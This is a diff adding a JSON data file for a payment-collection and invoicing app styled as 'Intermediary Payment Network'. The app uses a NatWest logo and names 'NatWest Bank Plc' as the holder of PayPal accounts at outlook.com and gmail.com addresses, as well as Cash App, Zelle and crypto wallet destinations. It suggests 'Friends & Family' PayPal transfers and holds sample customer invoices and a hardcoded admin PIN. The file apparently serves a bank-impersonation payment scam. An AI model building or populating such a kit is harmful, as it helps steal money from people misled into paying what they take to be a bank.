@@ -1,0 +1,429 @@
+{
+  "business": {
+    "name": "Intermediary Payment Network",
+    "tagline": "Intermediary Payment Network · Secure Direct Settlement",
+    "logoUrl": "/natwest-logo.svg",
+    "supportEmail": "settlement@intermediarynetwork.org",
+    "supportPhone": "+44 3457 888 444",
+    "defaultCurrency": "USD",
+    "defaultAmount": 250,
+    "defaultProductTitle": "Intermediary Payment Network Deliverable",
+    "defaultProductDescription": "Verified corporate and private direct settlement transaction cleared through Intermediary Payment Network desk.",
+    "adminPin": "SECRETadmin1234",
+    "customNotice": "All payments are directly verified and cleared by our Intermediary Payment Network settlement team.",
+    "defaultSectionHeader": "International Payment Summary",
+    "allowOpenAmount": false,
+    "verifiedMerchant": true
+  },
+  "methods": [
+    {
+      "id": "method-paypal-primary",
+      "name": "PayPal (NatWest Clearing)",
+      "type": "paypal",
+      "accountHandle": "transfers.natwest@outlook.com",
+      "accountHolder": "NatWest Bank Plc",
+      "instructions": "Send via PayPal to our registered settlement address. In the note/memo, please write your Reference ID or Customer Name so we can instantly match your transfer.",
+      "fields": [
+        {
+          "id": "f-pp-email",
+          "label": "PayPal Email",
+          "value": "transfers.natwest@outlook.com",
+          "copyable": true
+        },
+        {
+          "id": "f-pp-holder",
+          "label": "Account Name",
+          "value": "NatWest Bank Plc",
+          "copyable": false
+        },
+        {
+          "id": "f-pp-type",
+          "label": "Transfer Type",
+          "value": "Friends & Family or Goods & Services",
+          "copyable": false
+        }
+      ],
+      "qrData": "https://paypal.me/natwestpay",
+      "isActive": true,
+      "isPrimary": true,
+      "feeNote": "Zero additional surcharge",
+      "category": "digital",
+      "createdAt": "2026-11-01T10:00:00.000Z",
+      "updatedAt": "2026-11-03T04:30:00.000Z"
+    },
+    {
+      "id": "method-paypal-backup",
+      "name": "PayPal (Secondary / Backup)",
+      "type": "paypal",
+      "accountHandle": "natwest.settlements@gmail.com",
+      "accountHolder": "NatWest Bank Plc",
+      "instructions": "Alternative verified PayPal address for fast clearing. Send payment and enter reference below.",
+      "fields": [
+        {
+          "id": "f-pp2-email",
+          "label": "PayPal Email",
+          "value": "natwest.settlements@gmail.com",
+          "copyable": true
+        },
+        {
+          "id": "f-pp2-holder",
+          "label": "Account Name",
+          "value": "NatWest Bank Plc",
+          "copyable": false
+        }
+      ],
+      "qrData": "https://paypal.me/natwestpaybackup",
+      "isActive": false,
+      "isPrimary": false,
+      "feeNote": "Backup payment channel",
+      "category": "digital",
+      "createdAt": "2026-11-01T11:00:00.000Z",
+      "updatedAt": "2026-11-02T12:00:00.000Z"
+    },
+    {
+      "id": "method-zelle",
+      "name": "Zelle Direct",
+      "type": "zelle",
+      "accountHandle": "settlement@natwest.com",
+      "accountHolder": "NatWest Bank Plc",
+      "instructions": "Open your banking app and send to our registered NatWest Zelle email address or phone number.",
+      "fields": [
+        {
+          "id": "f-z-email",
+          "label": "Zelle Email",
+          "value": "settlement@natwest.com",
+          "copyable": true
+        },
+        {
+          "id": "f-z-phone",
+          "label": "Zelle Phone",
+          "value": "+1 (415) 890-2341",
+          "copyable": true
+        },
+        {
+          "id": "f-z-holder",
+          "label": "Recipient Name",
+          "value": "NatWest Bank Plc",
+          "copyable": false
+        }
+      ],
+      "isActive": true,
+      "isPrimary": false,
+      "feeNote": "Instant bank-to-bank settlement",
+      "category": "digital",
+      "createdAt": "2026-11-01T10:00:00.000Z",
+      "updatedAt": "2026-11-03T02:00:00.000Z"
+    },
+    {
+      "id": "method-cashapp",
+      "name": "Cash App",
+      "type": "cashapp",
+      "accountHandle": "$NatWestPay",
+      "accountHolder": "NatWest Bank Plc",
+      "instructions": "Send directly to our official $Cashtag. Please add your Invoice reference in the \"For\" field.",
+      "fields": [
+        {
+          "id": "f-ca-tag",
+          "label": "Cashtag",
+          "value": "$NatWestPay",
+          "copyable": true
+        },
+        {
+          "id": "f-ca-url",
+          "label": "Web Link",
+          "value": "https://cash.app/$NatWestPay",
+          "copyable": true
+        }
+      ],
+      "qrData": "https://cash.app/$NatWestPay",
+      "isActive": true,
+      "isPrimary": false,
+      "feeNote": "Instant mobile transfer",
+      "category": "digital",
+      "createdAt": "2026-11-01T10:00:00.000Z",
+      "updatedAt": "2026-11-02T15:00:00.000Z"
+    },
+    {
+      "id": "method-bank-wire",
+      "name": "Bank Wire / BACS / CHAPS & SWIFT",
+      "type": "bank_wire",
+      "accountHandle": "National Westminster Bank Plc (Acct ending 4918)",
+      "accountHolder": "NatWest Bank Plc",
+      "instructions": "For UK domestic Faster Payments/BACS/CHAPS or international SWIFT wire. Quote your reference in the payment description.",
+      "fields": [
+        {
+          "id": "f-bw-bank",
+          "label": "Bank Name",
+          "value": "National Westminster Bank Plc (NatWest)",
+          "copyable": true
+        },
+        {
+          "id": "f-bw-sort",
+          "label": "Sort Code (UK)",
+          "value": "60-00-01",
+          "copyable": true
+        },
+        {
+          "id": "f-bw-acct",
+          "label": "Account Number",
+          "value": "84920491",
+          "copyable": true
+        },
+        {
+          "id": "f-bw-swift",
+          "label": "SWIFT / BIC",
+          "value": "NWBKGB2L",
+          "copyable": true
+        },
+        {
+          "id": "f-bw-address",
+          "label": "Bank Address",
+          "value": "135 Bishopsgate, London, EC2M 3UR, United Kingdom",
+          "copyable": false
+        }
+      ],
+      "isActive": true,
+      "isPrimary": false,
+      "feeNote": "Official UK Clearing Bank Network",
+      "category": "bank",
+      "createdAt": "2026-11-01T10:00:00.000Z",
+      "updatedAt": "2026-11-01T10:00:00.000Z"
+    },
+    {
+      "id": "method-crypto-usdt",
+      "name": "Crypto (USDT / USDC ERC-20)",
+      "type": "crypto",
+      "accountHandle": "0x71C8A3E9b98048fD9764585B5F3Eec0707D87a21",
+      "accountHolder": "NatWest Bank Digital Treasury",
+      "instructions": "Send strictly USDT or USDC on Ethereum (ERC-20) network. Copy the exact wallet address or scan the QR code.",
+      "fields": [
+        {
+          "id": "f-cr-network",
+          "label": "Network",
+          "value": "Ethereum Mainnet (ERC-20)",
+          "copyable": false
+        },
+        {
+          "id": "f-cr-addr",
+          "label": "Wallet Address",
+          "value": "0x71C8A3E9b98048fD9764585B5F3Eec0707D87a21",
+          "copyable": true
+        }
+      ],
+      "qrData": "ethereum:0x71C8A3E9b98048fD9764585B5F3Eec0707D87a21",
+      "isActive": true,
+      "isPrimary": false,
+      "feeNote": "Blockchain confirmed",
+      "category": "crypto",
+      "createdAt": "2026-11-01T10:00:00.000Z",
+      "updatedAt": "2026-11-01T10:00:00.000Z"
+    }
+  ],
+  "invoices": [
+    {
+      "id": "INV-2026-1852",
+      "trackingId": "CLIENT-NEW-TEST-99",
+      "headerText": "International Payment Summary",
+      "title": "Intermediary Payment Network",
+      "description": "Verified direct settlement transaction cleared through Intermediary Payment Network desk.",
+      "customerName": "Direct Client",
+      "customerEmail": "",
+      "amount": 250,
+      "currency": "USD",
+      "status": "waiting",
+      "dueDate": "",
+      "lastRequestedAt": "2026-11-08T11:36:31.403Z",
+      "paymentRefCode": "NW-39940",
+      "assignedBankDetails": {
+        "methodId": "method-bank",
+        "bankName": "NatWest Bank Plc",
+        "accountHolder": "NatWest Bank Plc",
+        "accountNumber": "84920491",
+        "sortCodeOrRouting": "60-00-01",
+        "swiftOrIban": "NWBKGB2L",
+        "instructions": "Please transfer the exact amount and quote your Payment Reference Code.",
+        "accountHandle": "84920491",
+        "fields": [
+          {
+            "id": "f-b-name",
+            "label": "Bank Name",
+            "value": "NatWest Bank Plc",
+            "copyable": true
+          },
+          {
+            "id": "f-b-sort",
+            "label": "Sort Code",
+            "value": "60-00-01",
+            "copyable": true
+          },
+          {
+            "id": "f-b-acct",
+            "label": "Account Number",
+            "value": "84920491",
+            "copyable": true
+          },
+          {
+            "id": "f-b-swift",
+            "label": "SWIFT / BIC",
+            "value": "NWBKGB2L",
+            "copyable": true
+          }
+        ]
+      },
+      "createdAt": "2026-11-08T11:36:31.403Z"
+    },
+    {
+      "id": "INV-2026-881",
+      "trackingId": "TRK-90412",
+      "title": "NatWest Settlement & Consulting Deliverable",
+      "description": "Milestone settlement clearing: Account review, digital assets deliverable, and direct post-settlement verification.",
+      "amount": 1850,
+      "currency": "GBP",
+      "customerName": "Sarah Jenkins",
+      "customerEmail": "sarah.j@novadesign.io",
+      "status": "ready",
+      "dueDate": "2026-11-15",
+      "createdAt": "2026-11-02T14:20:00.000Z",
+      "lastRequestedAt": "2026-11-11T11:47:46.454Z",
+      "assignedBankDetails": {
+        "bankName": "National Westminster Bank Plc",
+        "accountHolder": "NatWest Treasury UK",
+        "accountNumber": "84920491",
+        "sortCodeOrRouting": "60-00-01",
+        "swiftOrIban": "NWBKGB2L",
+        "instructions": "Transfer via Faster Payments quoting reference code NW-90412.",
+        "accountHandle": "",
+        "fields": []
+      },
+      "paymentRefCode": "NW-90412",
+      "readyAt": "2026-11-06T15:43:48.794Z"
+    },
+    {
+      "id": "INV-2026-882",
+      "trackingId": "TRK-58210",
+      "title": "Corporate Infrastructure Settlement",
+      "description": "Infrastructure hardening, CDN setup, database indexing and speed audits.",
+      "amount": 850,
+      "currency": "USD",
+      "customerName": "Marcus Vance",
+      "customerEmail": "m.vance@vancetech.com",
+      "status": "verified",
+      "dueDate": "2026-11-08",
+      "createdAt": "2026-11-01T09:15:00.000Z",
+      "proofId": "proof-882-demo"
+    },
+    {
+      "id": "INV-2026-883",
+      "trackingId": "TRK-77104",
+      "title": "Enterprise Cloud Migration & Support",
+      "description": "Cloud cluster deployment, high-availability replication, and NatWest clearing account settlement.",
+      "amount": 2400,
+      "currency": "USD",
+      "customerName": "Alexander Wright",
+      "customerEmail": "a.wright@enterprise.co",
+      "status": "pending",
+      "dueDate": "2026-11-20",
+      "createdAt": "2026-11-03T10:00:00.000Z"
+    }
+  ],
+  "proofs": [
+    {
+      "id": "proof-882-demo",
+      "invoiceId": "INV-2026-882",
+      "methodId": "method-zelle",
+      "methodName": "Zelle Direct",
+      "senderName": "Marcus Vance",
+      "senderEmail": "m.vance@vancetech.com",
+      "amount": 850,
+      "currency": "USD",
+      "transactionReference": "ZEL-994821034",
+      "customerNotes": "Sent from bank at 10:14 AM.",
+      "submittedAt": "2026-11-01T14:25:00.000Z",
+      "status": "verified",
+      "verifiedAt": "2026-11-01T14:40:00.000Z",
+      "adminNotes": "Payment verified in NatWest clearing account. Invoice marked paid."
+    }
+  ],
+  "paymentRequests": [
+    {
+      "id": "req-1794397677712-au34z",
+      "invoiceId": "INV-2026-881",
+      "methodId": "method-zelle",
+      "methodName": "Zelle Direct",
+      "methodType": "zelle",
+      "customerName": "Sarah Jenkins",
+      "amount": 250,
+      "currency": "USD",
+      "status": "ready",
+      "createdAt": "2026-11-11T11:47:57.712Z",
+      "expiresAt": "2026-11-11T11:49:57.712Z",
+      "assignedDetails": {
+        "accountHandle": "pay.quick@natwest.com",
+        "accountHolder": "NatWest Corp Payee",
+        "instructions": "Send via Zelle",
+        "fields": [
+          {
+            "id": "f-z-handle",
+            "label": "Zelle Email",
+            "value": "pay.quick@natwest.com",
+            "copyable": true
+          },
+          {
+            "id": "f-z-holder",
+            "label": "Recipient Name",
+            "value": "NatWest Corp Payee",
+            "copyable": false
+          },
+          {
+            "id": "f-z-type",
+            "label": "Transfer Type",
+            "value": "Zelle Instant Bank-to-Bank",
+            "copyable": false
+          }
+        ],
+        "feeNote": "Instant bank-to-bank settlement"
+      },
+      "updatedAt": "2026-11-11T11:48:02.548Z"
+    },
+    {
+      "id": "req-1793982203213-tpt81",
+      "invoiceId": "INV-2026-883",
+      "methodId": "method-paypal-primary",
+      "methodName": "PayPal (NatWest Clearing)",
+      "methodType": "paypal",
+      "amount": 2400,
+      "currency": "USD",
+      "status": "ready",
+      "createdAt": "2026-11-06T16:23:23.213Z",
+      "expiresAt": "2026-11-06T16:25:23.213Z",
+      "assignedDetails": {
+        "accountHandle": "clearing.desk@natwest.com",
+        "accountHolder": "NatWest Clearing Division",
+        "instructions": "Send to clearing.desk@natwest.com and include ref NW-883.",
+        "fields": [
+          {
+            "id": "f-pp-email",
+            "label": "PayPal Email",
+            "value": "transfers.natwest@outlook.com",
+            "copyable": true
+          },
+          {
+            "id": "f-pp-holder",
+            "label": "Account Name",
+            "value": "NatWest Bank Plc",
+            "copyable": false
+          },
+          {
+            "id": "f-pp-type",
+            "label": "Transfer Type",
+            "value": "Friends & Family or Goods & Services",
+            "copyable": false
+          }
+        ],
+        "qrData": "https://paypal.me/natwestpay",
+        "feeNote": "Zero additional surcharge"
+      },
+      "updatedAt": "2026-11-06T16:23:27.324Z"
+    }
+  ]
+}
